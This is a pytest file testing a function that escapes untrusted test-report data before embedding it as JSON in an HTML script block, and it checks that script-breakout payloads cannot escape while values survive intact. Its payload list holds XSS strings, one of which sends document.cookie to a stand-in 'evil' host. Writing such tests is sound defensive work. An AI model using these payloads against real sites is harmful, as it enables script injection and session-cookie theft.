"""Safe embedding of untrusted data in a `<script>` block.

The offline report puts every test name, log line and stack trace inside an HTML
document. Those strings come from whatever the tests under observation printed,
which means they are attacker-controlled. This is the boundary that makes that
safe, so it is tested against the actual payloads an attacker would use.
"""

from __future__ import annotations

import json
import re

import pytest

from test_hub.export.snapshot import embed_json

#: Named rather than written inline: these two characters are invisible in a
#: source file and a reviewer cannot tell them from a space.
LINE_SEPARATOR = "\u2028"
PARAGRAPH_SEPARATOR = "\u2029"

BREAKOUT_PAYLOADS = [
    "</script><img src=x onerror=alert(1)>",
    "</SCRIPT><script>alert(1)</script>",
    "</script\t><script>alert(1)</script>",
    "</script\n><svg onload=alert(1)>",
    "<!--</script>--><script>alert(1)</script>",
    "</script>",
    "</script>",
    '"><script>alert(document.domain)</script>',
    "<img src=x onerror=fetch('//evil/'+document.cookie)>",
    "]]></script>",
    "&lt;script&gt;",
]


@pytest.mark.parametrize("payload", BREAKOUT_PAYLOADS)
def test_no_payload_can_close_the_script_element(payload: str) -> None:
    rendered = embed_json({"name": payload})
    assert "</script" not in rendered.lower()
    assert "<" not in rendered
    assert ">" not in rendered


@pytest.mark.parametrize("payload", BREAKOUT_PAYLOADS)
def test_the_original_value_survives_exactly(payload: str) -> None:
    """Escaping must not corrupt the data — a test name has to render as itself."""
    assert json.loads(embed_json({"name": payload}))["name"] == payload


def test_javascript_line_terminators_are_escaped() -> None:
    """U+2028 and U+2029 are legal in JSON and illegal in a JS string literal."""
    raw = "before" + LINE_SEPARATOR + "after" + PARAGRAPH_SEPARATOR + "end"
    rendered = embed_json({"log": raw})
    assert LINE_SEPARATOR not in rendered
    assert PARAGRAPH_SEPARATOR not in rendered
    assert json.loads(rendered)["log"] == raw


def test_ampersands_are_escaped_so_html_entities_cannot_form() -> None:
    rendered = embed_json({"q": "a&lt;b"})
    assert "&" not in rendered
    assert json.loads(rendered)["q"] == "a&lt;b"


def test_ordinary_unicode_is_left_readable() -> None:
    """Escaping everything would quadruple the file size for no benefit."""
    rendered = embed_json({"name": "test_café_✓_日本語"})
    assert "café" in rendered
    assert json.loads(rendered)["name"] == "test_café_✓_日本語"


def test_nested_structures_are_escaped_throughout() -> None:
    payload = {"runs": [{"tests": [{"failure": {"stack_trace": "</script><script>x</script>"}}]}]}
    rendered = embed_json(payload)
    assert "<" not in rendered
    assert json.loads(rendered) == payload


def test_output_is_still_valid_json() -> None:
    for payload in BREAKOUT_PAYLOADS:
        json.loads(embed_json({"a": payload, "b": [payload], "c": {"d": payload}}))


def test_the_escapes_are_json_unicode_escapes_not_html_entities() -> None:
    """`&lt;` inside JSON would change the value; `\\u003c` does not."""
    rendered = embed_json({"x": "<"})
    assert re.search(r"\\u003c", rendered)
    assert "&lt;" not in rendered
